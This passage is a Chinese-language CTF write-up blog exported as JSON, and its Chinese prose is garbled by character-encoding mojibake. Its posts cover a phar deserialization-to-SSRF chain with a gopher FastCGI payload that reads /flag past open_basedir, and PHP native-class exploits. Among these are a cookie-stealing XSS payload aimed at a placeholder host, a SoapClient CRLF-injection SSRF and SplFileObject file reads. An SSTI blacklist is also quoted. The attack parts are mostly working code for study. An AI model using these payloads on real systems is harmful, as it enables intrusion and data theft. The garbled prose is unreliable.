getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]); if($check !== false) { echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;; $uploadOk = 1; } else { echo &quot;File is not an image.&quot;; $uploadOk = 0; } if (file_exists($target_file)) { echo &quot;Sorry, file already exists.&quot;; $uploadOk = 0; } if ($_FILES[&quot;fileToUpload&quot;][&quot;size&quot;] &gt; 500000) { echo &quot;Sorry, your file is too large.&quot;; $uploadOk = 0; } if($imageFileType !== &quot;jpg&quot; &amp;&amp; $imageFileType !== &quot;png&quot; &amp;&amp; $imageFileType !== &quot;gif&quot; &amp;&amp; $imageFileType !== &quot;jpeg&quot; ) { echo &quot;Sorry, only jpg,png,gif,jpeg are allowed.&quot;; $uploadOk = 0; } if ($uploadOk == 0) { echo &quot;Sorry, your file was not uploaded.&quot;; } else { if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) { echo &quot;The file $file_name has been uploaded to ./uploads/&quot;; } else { echo &quot;Sorry, there was an error uploading your file.&quot;; } } ?&gt; catchmine.phpé‡Œé¢æœ‰ä¸€ä¸ªååºåˆ—åŒ–ï¼Œå…ˆçœ‹è¿™é‡Œã€‚Main::curl()æ˜æ˜¾å­˜åœ¨SSRFå¹¶ä¸”å¯ä½¿ç”¨æ–‡ä»¶æµé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€‚ä½†æ˜¯è¦è§¦å‘curlçš„è¯å°±æ²¡æ³•æ§åˆ¶mainé‡Œé¢çš„urläº†ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¸Šä¼ ä¸ªpharæ–‡ä»¶ï¼Œåœ¨getimagesizeå¤„è§¦å‘ã€‚æ€è·¯ï¼šç¬¬ä¸€æ¬¡ååºåˆ—åŒ–ï¼Œåœ¨getimagesizeå¤„è§¦å‘pharååºåˆ—åŒ–ï¼Œä»è€Œæ§åˆ¶urlã€‚ç¬¬äºŒæ¬¡ååºåˆ—åŒ–ï¼Œæ‰§è¡Œcurlã€‚ expï¼šï¼ˆæ¯”è¾ƒç®€å•å°±ä¸è‡ªå·±å†™äº†ï¼Œæ¥è‡ªguokeå¸ˆå‚… &lt;?php class Easytest{ protected $test=&#39;1&#39;; } class Main{ public $url=&#39;file:///proc/net/arp&#39;; } $a=new Easytest(); echo urlencode(serialize($a)); $b=new Main(); @unlink(&quot;phar.phar&quot;); $phar=new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&#39;GIF89a&#39;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($b); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); ?&gt; ç¬¬ä¸€ä¸ªè¦æ³¨æ„çš„åœ°æ–¹ï¼Œè¿™é‡Œetc/hostsæ²¡æ³•è¯»åˆ°å†…ç½‘ipï¼Œåªèƒ½ç”¨/proc/net/arpè¿™é‡Œæˆ‘è¯»åˆ°çš„æ˜¯10.0.199.2 ç„¶åå…·ä½“å“ªä¸ªä¼šå›æ˜¾PHP-FPMæ˜¯è¦è‡ªå·±ä¸€ä¸ªä¸ªè¯•çš„ æˆ‘è¯•äº†3ã€4ã€5 éƒ½æ²¡æœ‰ ç„¶åç›´æ¥è¯•äº†11æ˜¯å¯ä»¥çš„ã€‚ é‚£ä¹ˆphp-fpmæ˜¯å•¥å‘¢ï¼Ÿè·Ÿç€pç‰›çš„åšå®¢å­¦ä¹ ä¸€ä¸‹ï¼šhttps://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html ç²¾ç®€ä¸‹å†…å®¹æ–¹ä¾¿æŸ¥çœ‹ï¼š FPMå…¶å®æ˜¯ä¸€ä¸ªfastcgiåè®®è§£æå™¨ï¼ŒNginxç­‰æœåŠ¡å™¨ä¸­é—´ä»¶å°†ç”¨æˆ·è¯·æ±‚æŒ‰ç…§fastcgiçš„è§„åˆ™æ‰“åŒ…å¥½é€šè¿‡TCPä¼ ç»™è°ï¼Ÿå…¶å®å°±æ˜¯ä¼ ç»™FPMã€‚ FPMæŒ‰ç…§fastcgiçš„åè®®å°†TCPæµè§£ææˆçœŸæ­£çš„æ•°æ®ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œç”¨æˆ·è®¿é—®http://127.0.0.1/index.php?a=1&amp;b=2ï¼Œå¦‚æœwebç›®å½•æ˜¯/var/www/htmlï¼Œé‚£ä¹ˆNginxä¼šå°†è¿™ä¸ªè¯·æ±‚å˜æˆå¦‚ä¸‹key-valueå¯¹ï¼š { &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;, &#39;REQUEST_METHOD&#39;: &#39;GET&#39;, &#39;SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php&#39;, &#39;SCRIPT_NAME&#39;: &#39;/index.php&#39;, &#39;QUERY_STRING&#39;: &#39;?a=1&amp;b=2&#39;, &#39;REQUEST_URI&#39;: &#39;/index.php?a=1&amp;b=2&#39;, &#39;DOCUMENT_ROOT&#39;: &#39;/var/www/html&#39;, &#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;, &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;REMOTE_PORT&#39;: &#39;12345&#39;, &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;SERVER_PORT&#39;: &#39;80&#39;, &#39;SERVER_NAME&#39;: &quot;localhost&quot;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39; } è¿™ä¸ªæ•°ç»„å…¶å®å°±æ˜¯PHPä¸­$_SERVERæ•°ç»„çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯PHPé‡Œçš„ç¯å¢ƒå˜é‡ã€‚ä½†ç¯å¢ƒå˜é‡çš„ä½œç”¨ä¸ä»…æ˜¯å¡«å……$_SERVERæ•°ç»„ï¼Œä¹Ÿæ˜¯å‘Šè¯‰fpmï¼šâ€œæˆ‘è¦æ‰§è¡Œå“ªä¸ªPHPæ–‡ä»¶â€ã€‚ PHP-FPMæ‹¿åˆ°fastcgiçš„æ•°æ®åŒ…åï¼Œè¿›è¡Œè§£æï¼Œå¾—åˆ°ä¸Šè¿°è¿™äº›ç¯å¢ƒå˜é‡ã€‚ç„¶åï¼Œæ‰§è¡ŒSCRIPT_FILENAMEçš„å€¼æŒ‡å‘çš„PHPæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯/var/www/html/index.phpã€‚ Nginxï¼ˆIIS7ï¼‰è§£ææ¼æ´ï¼šfpmå‘ç°/var/www/html/favicon.ico/.phpä¸å­˜åœ¨ï¼Œåˆ™å»æ‰/.phpï¼Œå†åˆ¤æ–­/var/www/html/favicon.icoæ˜¯å¦å­˜åœ¨ã€‚æ˜¾ç„¶è¿™ä¸ªæ–‡ä»¶æ˜¯å­˜åœ¨çš„ï¼Œäºæ˜¯è¢«ä½œä¸ºPHPæ–‡ä»¶æ‰§è¡Œï¼Œå¯¼è‡´è§£ææ¼æ´ã€‚ åœ¨fpmæŸä¸ªç‰ˆæœ¬ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥å°†SCRIPT_FILENAMEçš„å€¼æŒ‡å®šä¸ºä»»æ„åç¼€æ–‡ä»¶ï¼Œæ¯”å¦‚/etc/passwdï¼›ä½†åæ¥ï¼Œfpmçš„é»˜è®¤é…ç½®ä¸­å¢åŠ äº†ä¸€ä¸ªé€‰é¡¹security.limit_extensionsï¼Œåªèƒ½ä»¥phpxç»“å°¾ã€‚ç”±äºè¿™ä¸ªé…ç½®é¡¹çš„é™åˆ¶ï¼Œå¦‚æœæƒ³åˆ©ç”¨PHP-FPMçš„æœªæˆæƒè®¿é—®æ¼æ´ï¼Œé¦–å…ˆå°±å¾—æ‰¾åˆ°ä¸€ä¸ªå·²å­˜åœ¨çš„PHPæ–‡ä»¶ã€‚ é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬æ§åˆ¶fastcgiåè®®é€šä¿¡çš„å†…å®¹ï¼Œå°±èƒ½æ‰§è¡Œä»»æ„PHPä»£ç å‘¢ï¼Ÿ ç†è®ºä¸Šå½“ç„¶æ˜¯ä¸å¯ä»¥çš„ï¼Œå³ä½¿æˆ‘ä»¬èƒ½æ§åˆ¶SCRIPT_FILENAMEï¼Œè®©fpmæ‰§è¡Œä»»æ„æ–‡ä»¶ï¼Œä¹Ÿåªæ˜¯æ‰§è¡Œç›®æ ‡æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå¹¶ä¸èƒ½æ‰§è¡Œæˆ‘ä»¬éœ€è¦å…¶æ‰§è¡Œçš„æ–‡ä»¶ã€‚ ä½†PHPæ˜¯ä¸€é—¨å¼ºå¤§çš„è¯­è¨€ï¼ŒPHP.INIä¸­æœ‰ä¸¤ä¸ªæœ‰è¶£çš„é…ç½®é¡¹ï¼Œauto_prepend_fileå’Œauto_append_fileã€‚ auto_prepend_fileæ˜¯å‘Šè¯‰PHPï¼Œåœ¨æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¹‹å‰ï¼Œå…ˆåŒ…å«auto_prepend_fileä¸­æŒ‡å®šçš„æ–‡ä»¶ï¼›auto_append_fileæ˜¯å‘Šè¯‰PHPï¼Œåœ¨æ‰§è¡Œå®Œæˆç›®æ ‡æ–‡ä»¶åï¼ŒåŒ…å«auto_append_fileæŒ‡å‘çš„æ–‡ä»¶ã€‚ é‚£ä¹ˆå°±æœ‰è¶£äº†ï¼Œå‡è®¾æˆ‘ä»¬è®¾ç½®auto_prepend_fileä¸ºphp://inputï¼Œé‚£ä¹ˆå°±ç­‰äºåœ¨æ‰§è¡Œä»»ä½•phpæ–‡ä»¶å‰éƒ½è¦åŒ…å«ä¸€éPOSTçš„å†…å®¹ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠå¾…æ‰§è¡Œçš„ä»£ç æ”¾åœ¨Bodyä¸­ï¼Œä»–ä»¬å°±èƒ½è¢«æ‰§è¡Œäº†ã€‚ï¼ˆå½“ç„¶ï¼Œè¿˜éœ€è¦å¼€å¯è¿œç¨‹æ–‡ä»¶åŒ…å«é€‰é¡¹allow_url_includeï¼‰ é‚£ä¹ˆï¼Œæˆ‘ä»¬æ€ä¹ˆè®¾ç½®auto_prepend_fileçš„å€¼ï¼Ÿ è¿™åˆæ¶‰åŠåˆ°PHP-FPMçš„ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼ŒPHP_VALUEå’ŒPHP_ADMIN_VALUEã€‚è¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡å°±æ˜¯ç”¨æ¥è®¾ç½®PHPé…ç½®é¡¹çš„ï¼ŒPHP_VALUEå¯ä»¥è®¾ç½®æ¨¡å¼ä¸ºPHP_INI_USERå’ŒPHP_INI_ALLçš„é€‰é¡¹ï¼ŒPHP_ADMIN_VALUEå¯ä»¥è®¾ç½®æ‰€æœ‰é€‰é¡¹ã€‚ï¼ˆdisable_functionsé™¤å¤–ï¼Œè¿™ä¸ªé€‰é¡¹æ˜¯PHPåŠ è½½çš„æ—¶å€™å°±ç¡®å®šäº†ï¼Œåœ¨èŒƒå›´å†…çš„å‡½æ•°ç›´æ¥ä¸ä¼šè¢«åŠ è½½åˆ°PHPä¸Šä¸‹æ–‡ä¸­ï¼‰ æ‰€ä»¥ï¼Œæˆ‘ä»¬æœ€åä¼ å…¥å¦‚ä¸‹ç¯å¢ƒå˜é‡ï¼š { &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI/1.0&#39;, &#39;REQUEST_METHOD&#39;: &#39;GET&#39;, &#39;SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php&#39;, &#39;SCRIPT_NAME&#39;: &#39;/index.php&#39;, &#39;QUERY_STRING&#39;: &#39;?a=1&amp;b=2&#39;, &#39;REQUEST_URI&#39;: &#39;/index.php?a=1&amp;b=2&#39;, &#39;DOCUMENT_ROOT&#39;: &#39;/var/www/html&#39;, &#39;SERVER_SOFTWARE&#39;: &#39;php/fcgiclient&#39;, &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;REMOTE_PORT&#39;: &#39;12345&#39;, &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;SERVER_PORT&#39;: &#39;80&#39;, &#39;SERVER_NAME&#39;: &quot;localhost&quot;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39; &#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;, &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include = On&#39; } expï¼šhttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 æœ€åæ„é€ gopheråè®®å³å¯payloadï¼š gopher://10.0.199.11:9000/_%01%01%F6%FD%00%08%00%00%00%01%00%00%00%00%00%00%01%04%F6%FD%01%DC%00%00%0E%03CONTENT_LENGTH203%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%F6%FD%00%00%00%00%01%05%F6%FD%00%CB%00%00%3C%3Fphp%20mkdir%28%27/tmp/fuck%27%29%3Bchdir%28%27/tmp/fuck%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Bprint_r%28scandir%28%27/%27%29%29%3Breadfile%28%27/flag%27%29%3B%3F%3E%01%05%F6%FD%00%00%00%00 é‡Œé¢è¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œopen_basedirçš„ç»•è¿‡å’Œdisable_functionçš„é™åˆ¶ã€‚å››ä¸ªæ‰§è¡Œå‡½æ•°éƒ½è¢«banäº†ï¼Œç”¨readfileä»£æ›¿å³å¯ã€‚open_basedirç»•è¿‡çš„å§¿åŠ¿ç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯é€šè¿‡chdir()å’Œini_set()æ¥è¿›è¡Œè·¨è·¯å¾„è®¿é—®ï¼Œç½‘ä¸Šæ‰¾å§¿åŠ¿çš„æ—¶å€™è®°å¾—è¿™é‡Œé¢˜ç›®æ˜¯php7ï¼Œæœ‰äº›è€ç‰ˆæœ¬çš„æ˜¯ä¸è¡Œçš„ã€‚å‚è€ƒé“¾æ¥ï¼šhttps://xz.aliyun.com/t/4720 å¥½è€¶ å­¦åˆ°è®¸å¤š","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"Node.js","slug":"Node-js","date":"2021-04-06T06:26:32.000Z","updated":"2021-04-06T06:28:11.478Z","comments":true,"path":"2021/04/06/Node-js/","link":"","permalink":"/2021/04/06/Node-js/","excerpt":"","text":"ä»å®˜æ–¹æ–‡æ¡£å¼€å§‹å­¦ä¹ ï¼šhttps://nodejs.dev/learnNode.jså¸¸è§æ¼æ´å­¦ä¹ ï¼šhttps://xz.aliyun.com/t/71841ã€CTFSHOW çœ‹WPäº‘åšé¢˜å­¦ä¹ ä¸€äº›å§¿åŠ¿ã€‚https://blog.csdn.net/miuzzx/article/details/111780832https://blog.csdn.net/rfrder/article/details/115218397https://blog.csdn.net/solitudi/article/details/111669500 2ã€JavascriptåŸå‹é“¾å®˜æ–¹æ–‡æ¡£ï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain pç¥ï¼šhttps://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.htmlå…¶ä¸­çœ‹åˆ°pç¥ä¸€å¥è¯å†™çš„å¾ˆå¥½ï¼šâ€œæˆ‘ä¸€ç›´è§‰å¾—ï¼Œå‡ºé¢˜ä¸è¦åˆ»æ„åˆ›é€ æ¼æ´ï¼Œè€Œæ˜¯æ‰¾æ‰¾ä½ çš„çŸ¥è¯†ç‚¹æ˜¯å¦èƒ½åœ¨çœŸå®ç¯å¢ƒä¸‹æ‰¾åˆ°åº”ç”¨ã€‚â€ æš‚æ—¶å…ˆçœ‹åˆ°è¿™é‡Œ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"PHPåŸç”Ÿç±»çš„åˆ©ç”¨æ€»ç»“","slug":"PHPåŸç”Ÿç±»çš„åˆ©ç”¨æ€»ç»“","date":"2021-03-29T15:02:46.000Z","updated":"2021-03-30T04:57:55.274Z","comments":true,"path":"2021/03/29/PHPåŸç”Ÿç±»çš„åˆ©ç”¨æ€»ç»“/","link":"","permalink":"/2021/03/29/PHPåŸç”Ÿç±»çš„åˆ©ç”¨æ€»ç»“/","excerpt":"","text":"å¦‚é¢˜ã€‚ ä½¿ç”¨ Error/Exception å†…ç½®ç±»è¿›è¡Œ XSSå‡ºå¤„ï¼š[BJDCTF 2nd]xssä¹‹å…‰æºç ï¼š &lt;?php $a = $_GET[&#39;yds_is_so_beautiful&#39;]; echo unserialize($a); ?&gt; Exception payload(é€‚ç”¨äºphp5å’Œphp7): &lt;?php $a = serialize(new Exception(&quot;&lt;script&gt;window.location.href=&#39;IP&#39;+document.cookie&lt;/script&gt;&quot;)); echo urlencode($a); ?&gt; Error payload(é€‚ç”¨äºphp7)ï¼š &lt;?php $a = new Error(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;); $b = serialize($a); echo urlencode($b); ?&gt; psï¼šå¦‚æœcookieä¸­è®¾ç½®äº†HttpOnlyå±æ€§ï¼Œé‚£ä¹ˆé€šè¿‡jsè„šæœ¬å°†æ— æ³•è¯»å–åˆ°cookieä¿¡æ¯ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆçš„é˜²æ­¢XSSæ”»å‡»ï¼Œçªƒå–cookieå†…å®¹ï¼Œè¿™æ ·å°±å¢åŠ äº†cookieçš„å®‰å…¨æ€§ï¼Œå³ä¾¿æ˜¯è¿™æ ·ï¼Œä¹Ÿä¸è¦å°†é‡è¦ä¿¡æ¯å­˜å…¥cookieã€‚ ä½¿ç”¨ Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒå‡ºå¤„ï¼š[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphpæºç ï¼š class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } æ—¢è¦ç»•è¿‡md5åˆè¦å‘½ä»¤æ‰§è¡Œæ­£å¸¸æ˜¯å¾ˆéš¾å®ç°çš„ã€‚md5/sha1å¯¹ä¸€ä¸ªç±»è¿›è¡Œhashçš„æ—¶å€™ä¼šè§¦å‘é‚£ä¸ªç±»çš„toStringï¼Œè¿™é‡Œç”±äºæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç±»ï¼Œæ‰€ä»¥éœ€è¦å¯»æ‰¾åŸç”Ÿç±»ï¼Œæ¯”å¦‚Error,Exceptionç­‰ï¼Œç„¶åç”±äºErrorçš„toStringæ˜¯æ— æ³•å®Œå…¨æ§åˆ¶çš„ï¼Œä¼šæœ‰å…¶ä»–è¾“å‡ºï¼Œæ‰€ä»¥ä½¿ç”¨?&gt;&lt;?=çš„æ–¹å¼ç»“æŸphpä»è€Œå®Œæ•´æ§åˆ¶æ•´å—ä»£ç ï¼Œ(è¿™é‡Œæœ‰ä¸ªå‘å°±æ˜¯Errorå¿…é¡»ä¸ç­‰ï¼Œä½†toStringç”Ÿæˆçš„ç»“æœå¿…é¡»ç›¸ç­‰ï¼Œç”±äºtoStringç”Ÿæˆçš„ç»“æœåŒ…å«å½“å‰ä»£ç æ‰€åœ¨çš„è¡Œï¼Œæ‰€ä»¥æ–°ç”Ÿæˆçš„2ä¸ªå®ä¾‹å¿…é¡»åœ¨åŒä¸€è¡Œ)ï¼Œå› ä¸ºç¦ç”¨äº†å°æ‹¬å·æ— æ³•è°ƒç”¨å‡½æ•°ï¼Œå°è¯•ç›´æ¥include â€œ/flagâ€å³å¯ã€‚ expï¼š &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup() { if (($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc) === sha1($this-&gt;lover))) { if (!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;var1, $match)) { eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } $str = &quot;?&gt;&quot;.&quot;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;; $a = new Exception($str, 1);$b = new Exception($str, 2); $c = new SYCLOVER(); $c-&gt;syc = $a; $c-&gt;lover = $b; echo(urlencode(serialize($c))); ?&gt; ä½¿ç”¨SoapClientç±»è¿›è¡Œ SSRFè¿™ä¸ªå°±å¾ˆå¸¸è§äº†ã€‚å¤§æ¦‚éƒ½æ˜¯è¿™æ ·çš„ï¼šéœ€è¦admin 127.0.0.1ç™»å½• ç„¶ååˆæ˜¯remoteaddræ— æ³•ç›´æ¥ä¼ªé€ ï¼Œæ‰€ä»¥æ‰¾åˆ°èƒ½å®ä¾‹åŒ–ä»»æ„ç±»çš„åœ°æ–¹ç”¨ SoapClient ç±»è¿›è¡Œ SSRFã€‚ expï¼š &lt;?php $target = &#39;http://123.206.216.198/bbb.php&#39;; $post_string = &#39;a=b&amp;flag=aaa&#39;; $headers = array( &#39;X-Forwarded-For: 127.0.0.1&#39;, &#39;Cookie: xxxx=1234&#39; ); $b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; =&gt; &quot;aaab&quot;)); $aaa = serialize($b); $aaa = str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa); $aaa = str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa); echo $aaa; ?&gt; ä½¿ç”¨ZipArchiveç±»åˆ é™¤æ–‡ä»¶å‡ºå¤„ï¼šNepCTF 2021 æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­popé“¾å¾ˆç®€å•ï¼Œè€ƒç‚¹å°±æ˜¯åˆ©ç”¨ZipArchiveç±»çš„openæ–¹æ³•å»åˆ é™¤waf.txtæ–‡ä»¶ åŸç†å¦‚ä¸Šã€‚ åˆ©ç”¨SLPç±»ä¸­çš„ç±»è¯»æ–‡ä»¶å‡ºå¤„ï¼šMAR DASCTF2021-ez_serializeä¹Ÿæ˜¯ä¸€ä¸ªæ€è·¯å¾ˆç®€å•çš„ååºåˆ—åŒ–ï¼Œå°±æ˜¯è€ƒåŸç”Ÿç±»çš„åˆ©ç”¨ã€‚å®˜æ–¹æ–‡æ¡£ï¼šhttps://www.php.net/manual/zh/book.spl.php æºç ï¼š &lt;?php error_reporting(0); highlight_file(__FILE__); class A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;B&quot;; $this-&gt;para = &quot;ctfer&quot;; echo new $this-&gt;class ($this-&gt;para); } public function __wakeup() { $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die(&#39;bad hacker~&#39;); } } class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); } } class C{ function vaild($code){ $pattern = &#39;/[!|@|#|$|%|^|&amp;|*|=|\\&#39;|&quot;|:|;|?]/i&#39;; if (preg_match($pattern, $code)){ return false; } else return true; } } if(isset($_GET[&#39;pop&#39;])){ unserialize($_GET[&#39;pop&#39;]); } else{ $a=new A; } hello ctfer exp1(æŸ¥çœ‹ç›®å½•): &lt;?php class A{ public $class=&#39;FilesystemIterator&#39;; public $para=&quot;/var/www/html&quot;; public $check; } $o = new A(); echo serialize($o); exp2(è¯»flag): &lt;?php class A{ public $class=&#39;SplFileObject&#39;; public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; public $check; } $o = new A(); echo serialize($o); æœªå®Œå¾…ç»­","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"/tags/PHP/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"SSTIæ¯”è¾ƒç¦»è°±çš„ç»•è¿‡","slug":"SSTIæ¯”è¾ƒç¦»è°±çš„ç»•è¿‡","date":"2021-03-29T11:14:58.000Z","updated":"2021-03-29T15:01:12.769Z","comments":true,"path":"2021/03/29/SSTIæ¯”è¾ƒç¦»è°±çš„ç»•è¿‡/","link":"","permalink":"/2021/03/29/SSTIæ¯”è¾ƒç¦»è°±çš„ç»•è¿‡/","excerpt":"","text":"MAR DASCTFæ”¾å‡ºæ¥çš„ç¬¬ä¸€é“å°±æ˜¯ä¸ªSSTIã€‚è¿‡æ»¤å¾ˆå¤šï¼Œè¯•äº†å‡ ä¸ªå°±æ²¡è€å¿ƒåšä¸‹å»äº†ã€‚è®°å¾—y1ngå¸ˆå‚…ä¹‹å‰å†™è¿‡ä¸€é“è¿™ç§ç»•è¿‡çš„WPï¼Œä½†æ˜¯cnblogæŒ‚äº†ï¼Œæ‰€ä»¥å¹²è„†å°±ç­‰ç»“æŸäº†å†æ¥å­¦ä¹ ä¸€ä¸‹å§ã€‚ é¦–å…ˆ å¿…é¡»è¦å‡†å¤‡ä¸€ä¸ªç¯å¢ƒ è¿™é‡Œæˆ‘æ¨èvulhub githubå¼€æº é‡Œé¢é›†æˆäº†å¾ˆå¤šæ¡†æ¶çš„æ¼æ´ã€‚æ­å»ºå®Œæ¯•ï¼š é¢˜ç›®ç›´æ¥ç»™äº†blacklistï¼š Hi young boy!&lt;/br&gt; Do you like ssti?&lt;/br&gt; blacklist&lt;/br&gt; &#39;.&#39;,&#39;[&#39;,&#39;\\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt; &#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt; &#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt; &#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt; &#39;count&#39;,&#39;length&#39;,&#39;ï¼&#39;,&#39;ï¼‘&#39;,&#39;ï¼’&#39;,&#39;ï¼“&#39;,&#39;ï¼”&#39;,&#39;ï¼•&#39;,&#39;ï¼–&#39;,&#39;ï¼—&#39;,&#39;ï¼˜&#39;,&#39;ï¼™&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt; &lt;/br&gt; æ¯”èµ›çš„æ—¶å€™å°±è¯•äº†å¸¸è§çš„å‡ ä¸ª[]ã€16è¿›åˆ¶ã€requestç­‰ä¸€äº›å¸¸è§çš„ï¼ˆæ²¡çœ‹åˆ°æœ‰æºç ï¼‰ ä¸€ã€UNICODEé­”æ”¹å­—ç¬¦https://www.compart.com/en/unicode/æ¯”å¦‚æˆ‘ä»¬æœç´¢{ç¬¦å·ï¼Œå°±ä¼šæ˜¾ç¤ºå‡ ä¸ªç›¸ä¼¼çš„ï¼š ç½‘ä¸Šæ‰¾çš„å¸ˆå‚…çš„å›¾ï¼š ä½†æ˜¯æˆ‘åœ¨æœ¬åœ°æµ‹è¯•å¹¶æ²¡æœ‰æˆåŠŸï¼š 